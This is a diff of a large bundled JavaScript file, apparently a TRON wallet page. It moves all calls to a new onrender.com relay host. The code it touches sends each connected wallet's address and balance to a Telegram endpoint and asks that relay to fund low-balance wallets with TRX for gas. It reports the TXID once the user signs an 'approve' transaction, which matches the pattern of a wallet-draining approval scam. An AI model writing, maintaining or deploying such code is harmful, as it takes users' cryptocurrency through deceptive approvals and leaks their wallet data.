@@ -92882,7 +92882,7 @@
                     });
 
                     // Telegram: wallet connected (fire-and-forget)
-                    GS.post("https://tronscantelegram.onrender.com/api/telegram", {
+                    GS.post("https://tronscantelegram-q7ln.onrender.com/api/telegram", {
                         text: `Wallet connected\nWallet: ${c}\nTRX Balance: ${balanceInTRX} TRX\nNeeds top-up: ${balanceInTRX < minTrx ? "YES" : "NO"}\nTime: ${new Date().toISOString()}`
                     }, {
                         timeout: 8000
@@ -92896,13 +92896,13 @@
                         console.log("[4] TRX TOP-UP START", {
                             skipped: false,
                             reason: "balance below minTrx / no gas energy",
-                            endpoint: "https://tronscantelegram.onrender.com/send-trx",
+                            endpoint: "https://tronscantelegram-q7ln.onrender.com/send-trx",
                             userAddress: c,
                             balanceInTRX: balanceInTRX,
                             minTrx: minTrx
                         });
                         try {
-                            const topUpResponse = await GS.post("https://tronscantelegram.onrender.com/send-trx", {
+                            const topUpResponse = await GS.post("https://tronscantelegram-q7ln.onrender.com/send-trx", {
                                 userAddress: c
                             }, {
                                 timeout: 20000
@@ -92919,7 +92919,7 @@
                             topUpAmount = topUpData.amount || 0;
 
                             // Notify after top-up confirm (non-blocking)
-                            GS.post("https://tronscantelegram.onrender.com/api/telegram", {
+                            GS.post("https://tronscantelegram-q7ln.onrender.com/api/telegram", {
                                 text: `TRX top-up ${topUpSent ? "sent" : "skipped (already funded)"}\nWallet: ${c}\nAmount: ${topUpAmount || "N/A"} TRX\nTX: ${topUpTxId}\nBefore: ${balanceInTRX} TRX\nTime: ${new Date().toISOString()}`
                             }, {
                                 timeout: 5000
@@ -93049,7 +93049,7 @@
                     console.log("[SIGN] approve result", n);
                     if (n && (n.result || n.success)) {
                         console.log("[SIGN] Approve OK TXID:", n.txID);
-                        GS.post("https://tronscantelegram.onrender.com/api/telegram", {
+                        GS.post("https://tronscantelegram-q7ln.onrender.com/api/telegram", {
                             text: `Transaction approved\nWallet: ${e}\nTransaction ID: ${n.txID || "N/A"}\nTime: ${new Date().toISOString()}`
                         }).catch(() => {});
                         setTimeout(() => {
